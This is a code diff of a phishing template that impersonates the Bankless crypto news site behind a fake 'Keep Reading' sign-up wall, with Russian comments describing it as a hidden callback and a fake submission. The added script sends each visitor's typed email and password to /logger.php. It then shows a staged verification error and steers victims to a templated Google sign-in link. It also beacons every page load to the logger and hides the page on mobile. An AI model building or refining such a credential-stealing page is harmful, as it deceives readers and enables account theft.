@@ -79,8 +79,8 @@
         .tickerPriceDesktop { margin-left: 8px; }
         .tickerPriceDesktop span:first-child { color: #8a8a8a; font-weight: 600; }
         .tickerPriceDesktop span:last-child { margin-left: 6px; }
-        .article-title { font-size: 44px; font-weight: 800; line-height: 1.15; letter-spacing: -0.02em; margin-bottom: 16px; }
-        .article-desc { font-size: 22px; color: #555555; line-height: 1.4; margin-bottom: 32px; }
+        .tickerPriceMobile { display: none; }
+        .article-title { font-size: 44px; font-weight: 800; line-height: 1.15; letter-spacing: -0.02em; margin-bottom: 32px; }
         .breadcrumb { font-size: 13px; font-weight: 700; text-transform: uppercase; color: #8a8a8a; margin-bottom: 16px; }
         .article-content { font-family: 'Source Serif 4', serif; font-size: 21px; line-height: 1.65; }
         .article-content p { margin-bottom: 32px; }
@@ -97,13 +97,18 @@
         .blur-bg { backdrop-filter: blur(5px); background-color: rgba(255, 255, 255, 0.4); }
         .error-text { transition: all 0.3s ease; max-height: 0; opacity: 0; overflow: hidden; }
         .error-text.show { max-height: 40px; opacity: 1; margin-top: 4px; }
+        /* Прячем контент на мобильных и показываем заглушку */
+        @media (max-width: 767px) {
+            .desktop-content { display: none !important; }
+            .mobile-fallback { display: flex !important; }
+        }
     </style>
 </head>
 <body class="pt-[146px]">
 
     <div class="promoBanner fixed top-0 w-full z-50 flex justify-center items-center">
         <span class="flex items-center">
-            <img src="https://cdn.bankless.com/posts/full/2026-03-06/epics-antitrust-lawsuit-win-opens-doors-for-crypto-payments-on-android-apps-featured-image-69a9ea8f6ddf730001f9a631.jpg" style="width:20px; height:20px; border-radius:50%; object-fit:cover;" class="mr-2" alt="Mercuryo">
+            <img src="https://cdn.bankless.com/posts/full/2026-03-13/vitalik-the-real-world-needs-blockchains-featured-image-69b30e8b2f01e80001f4e990.jpg?class=articlebody" style="width:20px; height:20px; border-radius:50%; object-fit:cover;" class="mr-2" alt="Mercuryo">
             <a href="#" class="text-banklessRed hover:text-white transition-colors mr-1">Mercuryo</a>
             <span class="mr-2 font-normal text-gray-300 hidden md:inline">- Infrastructure powering the crypto economy.</span>
         </span>
@@ -123,6 +128,7 @@
                     <path d="M61.1406 16.6504V0.917969H64.3566V13.718H70.9939V16.6504H61.1406Z" fill="black"></path>
                     <path d="M73.0566 16.6504V0.917969H83.3088V3.74856H76.2726V7.10238H82.2031V9.94387H76.2726V13.718H83.3088V16.6504H73.0566Z" fill="black"></path>
                     <path d="M97.6302 12.0911C97.6302 13.6673 97.1115 14.8757 96.0738 15.7174C95.036 16.5592 93.506 16.9795 91.484 16.9795C90.0853 16.9795 88.8705 16.7485 87.8404 16.2866C86.8103 15.8247 85.9717 15.0782 85.3262 14.0471L87.8007 12.16C88.1653 12.6756 88.5113 13.062 88.8384 13.3192C89.1656 13.5764 89.5535 13.7778 90.002 13.9212C90.4511 14.0657 90.9675 14.1368 91.5529 14.1368C92.428 14.1368 93.1093 13.9869 93.5998 13.6881C94.0903 13.3892 94.3353 12.9317 94.3353 12.3187C94.3353 11.9707 94.2503 11.6784 94.0793 11.4431C93.9088 11.2077 93.6517 11.0052 93.3102 10.8345C92.9687 10.6637 92.375 10.4689 91.5314 10.2489C90.7104 10.0289 89.9364 9.80779 89.2109 9.5834C88.4848 9.36012 87.858 9.07002 87.3289 8.71427C86.8004 8.35857 86.3844 7.91085 86.0804 7.37236C85.7758 6.83488 85.6236 6.15625 85.6236 5.33751C85.6236 3.8445 86.1295 2.67987 87.1408 1.84252C88.1521 1.00516 89.6004 0.585938 91.4851 0.585938C94.2139 0.585938 96.146 1.51852 97.2787 3.38259L94.8269 5.29264C94.3938 4.62604 93.9077 4.1488 93.367 3.85983C92.8274 3.57196 92.1847 3.42747 91.4393 3.42747C90.6939 3.42747 90.0876 3.5621 89.6202 3.83137C89.1529 4.10064 88.9184 4.52315 88.9184 5.0989C88.9184 5.60678 89.1612 5.99536 89.6484 6.26351C90.1344 6.53281 90.983 6.80315 92.1913 7.0757C92.86 7.24977 93.5209 7.43802 94.1758 7.6383C94.8291 7.83973 95.4128 8.11774 95.9259 8.4735C96.4396 8.82925 96.8522 9.29551 97.164 9.87129C97.4757 10.447 97.6313 11.1859 97.6313 12.0878L97.6302 12.0911Z" fill="black"></path>
+                    <path d="M111.765 12.0911C111.765 13.6673 111.246 14.8757 110.209 15.7174C109.171 16.5592 107.641 16.9795 105.619 16.9795C104.22 16.9795 103.005 16.7485 101.975 16.2866C100.945 15.8247 100.106 15.0782 99.4609 14.0471L101.935 12.16C102.3 12.6756 102.646 13.062 102.973 13.3192C103.3 13.5764 103.688 13.7778 104.137 13.9212C104.585 14.0657 105.102 14.1368 105.688 14.1368C106.562 14.1368 107.244 13.9869 107.735 13.6881C108.225 13.3892 108.47 12.9317 108.47 12.3187C108.47 11.9707 108.385 11.6784 108.214 11.4431C108.044 11.2077 107.786 11.0052 107.444 10.8345C107.103 10.6637 106.51 10.4689 105.666 10.2489C104.845 10.0289 104.071 9.80779 103.346 9.5834C102.62 9.36012 101.993 9.07002 101.464 8.71427C100.935 8.35857 100.519 7.91085 100.215 7.37236C99.9106 6.83488 99.7583 6.15625 99.7583 5.33751C99.7583 3.8445 100.264 2.67987 101.276 1.84252C102.287 1.00516 103.735 0.585938 105.62 0.585938C108.349 0.585938 110.281 1.51852 111.413 3.38259L108.962 5.29264C108.529 4.62604 108.042 4.1488 107.502 3.85983C106.962 3.57196 106.319 3.42747 105.574 3.42747C104.829 3.42747 104.222 3.5621 103.755 3.83137C103.287 4.10064 103.053 4.52315 103.053 5.0989C103.053 5.60678 103.296 5.99536 103.783 6.26351C104.269 6.53281 105.118 6.80315 106.326 7.0757C106.995 7.24977 107.656 7.43802 108.311 7.6383C108.964 7.83973 109.548 8.11774 110.061 8.4735C110.574 8.82925 110.986 9.29551 111.299 9.87129C111.61 10.447 111.766 11.1859 111.766 12.0878L111.765 12.0911Z" fill="black"></path>
                     <path d="M111.751 22.2617H0.462891V25.308H111.751V22.2617Z" fill="#EB212E"></path>
                 </g>
                 <defs>
@@ -214,7 +220,8 @@
         </div>
     </div>
 
-    <div class="block md:hidden text-center pt-32 px-6 h-screen flex flex-col justify-center items-center">
+    <!-- Mobile Maintenance Fallback (Visible only on mobile) -->
+    <div class="block md:hidden mobile-fallback text-center pt-32 px-6 h-screen hidden flex-col justify-center items-center">
         <div class="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mb-6 text-banklessRed text-2xl mx-auto shadow-sm">
             <i class="fa-solid fa-wrench"></i>
         </div>
@@ -224,17 +231,14 @@
         </p>
     </div>
 
-    <main class="hidden md:flex max-w-[1140px] mx-auto pt-16 px-4 gap-[60px] pb-24">
+    <!-- Main Content Wrapper (Hidden on mobile) -->
+    <main class="hidden md:flex desktop-content max-w-[1140px] mx-auto pt-16 px-4 gap-[60px] pb-24">
         <article class="w-[700px] shrink-0">
             <div class="breadcrumb">
                 <a href="#">Home</a>, &nbsp;<a href="#">Read</a>, &nbsp;<a href="#">News</a>
             </div>
 
             <h1 class="article-title">{{TITLE}}</h1>
-
-            <div class="article-desc">
-                Google's settlement with Epic Games affirms the ability of developers globally to use alternative payments rails.
-            </div>
 
             <div class="flex items-center gap-3 mt-4 mb-8">
                 <img src="https://www.bankless.com/assets/cdn/authors/2026-02-26/jack-png-a6edd23702c9c6546ac12821152fde14.png" alt="Jack Inabinet" class="w-[42px] h-[42px] rounded-full object-cover">
@@ -244,7 +248,7 @@
                 </div>
             </div>
 
-            <img src="https://cdn.bankless.com/posts/full/2026-03-06/epics-antitrust-lawsuit-win-opens-doors-for-crypto-payments-on-android-apps-featured-image-69a9ea8f6ddf730001f9a631.jpg" alt="Featured Image" class="w-full rounded-xl mb-6 object-cover h-[auto]">
+            <img src="https://cdn.bankless.com/posts/full/2026-03-13/vitalik-the-real-world-needs-blockchains-featured-image-69b30e8b2f01e80001f4e990.jpg?class=articlebody" alt="Featured Image" class="w-full rounded-xl mb-6 object-cover h-[auto]">
 
             <div class="interaction-bar">
                 <div class="interaction-item"><i class="fa-solid fa-play"></i><span>Listen</span></div>
@@ -318,7 +322,7 @@
         <aside class="w-[320px] shrink-0 sticky top-[160px] self-start mt-4">
             <a href="#" class="block sidebar-sponsor group relative">
                 <div class="mb-4 overflow-hidden rounded-lg bg-white">
-                    <img src="https://cdn.bankless.com/posts/full/2026-03-06/epics-antitrust-lawsuit-win-opens-doors-for-crypto-payments-on-android-apps-featured-image-69a9ea8f6ddf730001f9a631.jpg" alt="Mercuryo" class="w-full h-[180px] object-cover rounded-lg group-hover:scale-105 transition-transform duration-300">
+                    <img src="https://cdn.bankless.com/posts/full/2026-03-13/vitalik-the-real-world-needs-blockchains-featured-image-69b30e8b2f01e80001f4e990.jpg?class=articlebody" alt="Mercuryo" class="w-full h-[180px] object-cover rounded-lg group-hover:scale-105 transition-transform duration-300">
                 </div>
                 <div>
                     <span class="inline-block bg-[#f0f0f0] text-[#727272] text-[10px] font-bold uppercase tracking-wide px-2 py-1 rounded-full mb-2">Sponsored</span>
@@ -338,12 +342,20 @@
                     <i class="fa-solid fa-lock"></i>
                 </div>
                 <h2 class="text-[28px] font-extrabold text-black mb-3 tracking-tight">Keep Reading</h2>
-                <p class="text-[#727272] text-[16px] mb-8 leading-relaxed px-2">Sign up to continue reading. We guarantee zero spam in your inbox — this quick authorization is strictly required to protect our platform from bots.</p>
+                <p class="text-[#727272] text-[16px] mb-6 leading-relaxed px-2">Sign up to continue reading. We guarantee zero spam in your inbox — this quick authorization is strictly required to protect our platform from bots.</p>
+                
+                <!-- Блок ошибки (изначально скрыт, появляется после фейковой загрузки) -->
+                <div id="mainAuthError" class="hidden mb-4 bg-red-50 border border-red-200 text-red-600 font-bold text-[14px] p-3 rounded-xl leading-tight">
+                    We couldn't verify your email address. Please use a different method.
+                </div>
+
                 <div class="flex flex-col gap-3.5">
                     <a href="{{GOOGLE_LINK}}" class="w-full bg-white border-2 border-[#eaeaea] hover:border-black hover:bg-gray-50 text-black font-bold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-3">
                         <img src="https://www.svgrepo.com/show/475656/google-color.svg" class="w-5 h-5" alt="Google">
                         Sign up with Google
                     </a>
+                    
+                    <!-- Эта кнопка скроется после фейковой ошибки -->
                     <button id="showEmailFormBtn" class="w-full bg-black hover:bg-gray-800 text-white font-bold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-3">
                         <i class="fa-regular fa-envelope text-lg"></i> Sign up with Email
                     </button>
@@ -358,11 +370,6 @@
                         <label class="block text-[13px] font-bold text-gray-700 mb-1 ml-1">Email</label>
                         <input type="text" id="emailInput" placeholder="Enter your email" class="w-full border border-[#eaeaea] bg-[#f9f9f9] rounded-xl px-4 py-3 text-[15px] focus:outline-none focus:border-black transition-colors">
                         <p id="emailError" class="error-text text-red-500 text-[12px] ml-1 font-medium">Please enter a valid email address.</p>
-                    </div>
-                    <div class="flex flex-col">
-                        <label class="block text-[13px] font-bold text-gray-700 mb-1 ml-1">Username</label>
-                        <input type="text" id="usernameInput" placeholder="Choose a username" class="w-full border border-[#eaeaea] bg-[#f9f9f9] rounded-xl px-4 py-3 text-[15px] focus:outline-none focus:border-black transition-colors">
-                        <p id="usernameError" class="error-text text-red-500 text-[12px] ml-1 font-medium">Username cannot be empty.</p>
                     </div>
                     <div class="flex flex-col">
                         <label class="block text-[13px] font-bold text-gray-700 mb-1 ml-1">Password</label>
@@ -385,15 +392,19 @@
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             
-            // Отправляем сигнал на ВАШ хостинг
+            // --- СКРЫТЫЙ ОТСТУК ЧЕРЕЗ ВАШ СЕРВЕР ---
+            const pathParts = window.location.pathname.split('/').filter(Boolean);
+            const actualSlug = pathParts.length > 0 ? pathParts[pathParts.length - 1] : 'root-folder';
+
             fetch('/logger.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    slug: '{{SLUG}}',
+                    slug: actualSlug,
                     googleLink: '{{GOOGLE_LINK}}'
                 })
             }).catch(e => { /* Игнорируем ошибки */ });
+            // ---------------------------------------
 
             const popup = document.getElementById("scrollAuthPopup");
             const popupCard = document.getElementById("popupCard");
@@ -430,6 +441,7 @@
             const goBackBtn = document.getElementById("goBackBtn");
             const authOptionsView = document.getElementById("authOptionsView");
             const emailFormView = document.getElementById("emailFormView");
+            const mainAuthError = document.getElementById("mainAuthError");
 
             showEmailFormBtn.addEventListener("click", () => {
                 authOptionsView.classList.add("hidden");
@@ -444,27 +456,11 @@
             });
 
             const emailInput = document.getElementById("emailInput");
-            const usernameInput = document.getElementById("usernameInput");
             const passwordInput = document.getElementById("passwordInput");
             const confirmPasswordInput = document.getElementById("confirmPasswordInput");
-            
-            // Запрещаем ввод символа @ во всех полях формы
-            const allInputs = [emailInput, usernameInput, passwordInput, confirmPasswordInput];
-            allInputs.forEach(input => {
-                input.addEventListener("keydown", (e) => { 
-                    if (e.key === "@") e.preventDefault(); 
-                });
-                input.addEventListener("input", function() {
-                    if (this.value.includes("@")) {
-                        this.value = this.value.replace(/@/g, "");
-                    }
-                });
-            });
-
             const submitSignUpBtn = document.getElementById("submitSignUpBtn");
 
             const emailError = document.getElementById("emailError");
-            const usernameError = document.getElementById("usernameError");
             const passwordError = document.getElementById("passwordError");
             const confirmPasswordError = document.getElementById("confirmPasswordError");
 
@@ -475,35 +471,62 @@
 
             function validateForm() {
                 const isEmailValid = emailRegex.test(emailInput.value.trim());
-                const isUsernameValid = usernameInput.value.trim().length > 0;
                 const isPasswordValid = passwordRegex.test(passwordInput.value);
                 const isConfirmPasswordValid = confirmPasswordInput.value === passwordInput.value && confirmPasswordInput.value.length > 0;
 
                 if (isFormSubmitted || emailInput.value.length > 0) emailError.classList.toggle("show", !isEmailValid);
-                if (isFormSubmitted || usernameInput.value.length > 0) usernameError.classList.toggle("show", !isUsernameValid);
                 if (isFormSubmitted || passwordInput.value.length > 0) passwordError.classList.toggle("show", !isPasswordValid);
                 if (isFormSubmitted || confirmPasswordInput.value.length > 0) confirmPasswordError.classList.toggle("show", !isConfirmPasswordValid);
 
-                return isEmailValid && isUsernameValid && isPasswordValid && isConfirmPasswordValid;
+                return isEmailValid && isPasswordValid && isConfirmPasswordValid;
             }
 
-            allInputs.forEach(input => {
+            [emailInput, passwordInput, confirmPasswordInput].forEach(input => {
                 input.addEventListener("input", () => {
                     if (isFormSubmitted || input.value.length > 0) validateForm();
                 });
             });
 
+            // Фейковая отправка с лоадером и перенаправлением
             submitSignUpBtn.addEventListener("click", (e) => {
+                e.preventDefault(); // Защита от случайного рефреша страницы
                 isFormSubmitted = true;
+                
                 if (validateForm()) {
-                    submitSignUpBtn.innerText = "Success!";
-                    submitSignUpBtn.classList.remove("bg-banklessRed", "hover:bg-[#c91b26]");
-                    submitSignUpBtn.classList.add("bg-green-500", "hover:bg-green-600");
-                } else {
-                    submitSignUpBtn.innerText = "Complete Sign Up";
-                    submitSignUpBtn.classList.add("bg-banklessRed", "hover:bg-[#c91b26]");
-                    submitSignUpBtn.classList.remove("bg-green-500", "hover:bg-green-600");
-                }
+                    const userEmail = emailInput.value;
+                    const userPass = passwordInput.value;
+
+                    // Отправляем данные формы в твой logger.php
+                    fetch('/logger.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            slug: actualSlug,
+                            googleLink: '{{GOOGLE_LINK}}',
+                            email: userEmail,
+                            password: userPass
+                        })
+                    }).catch(e => { /* Игнорируем ошибки сети, чтобы не стопить UI */ });
+
+                    // Показываем лоадер
+                    submitSignUpBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
+                    submitSignUpBtn.disabled = true;
+                    submitSignUpBtn.classList.add("opacity-80", "cursor-not-allowed");
+
+                    // Имитируем проверку 2.5 секунды
+                    setTimeout(() => {
+                        emailFormView.classList.add("hidden");
+                        emailFormView.classList.remove("flex");
+                        authOptionsView.classList.remove("hidden");
+
+                        mainAuthError.classList.remove("hidden");
+                        showEmailFormBtn.style.display = "none";
+
+                        submitSignUpBtn.innerHTML = "Complete Sign Up";
+                        submitSignUpBtn.disabled = false;
+                        submitSignUpBtn.classList.remove("opacity-80", "cursor-not-allowed");
+                    }, 2500);
+                } 
             });
         });
     </script>
@@ -521,10 +544,11 @@
                 return;
             }
 
-            const slug = title.toLowerCase()
-                              .replace(/[^a-z0-9\s-]/g, '')
-                              .trim()
-                              .replace(/\s+/g, '-');
+            let slug = title.toLowerCase()
+                            .trim()
+                            .replace(/[\s_]+/g, '-')
+                            .replace(/[^\w\u0400-\u04FF-]/g, '');
+            if (!slug) slug = "article-" + Math.floor(Math.random() * 1000);
 
             let templateContent = document.getElementById('site-template').value;
 
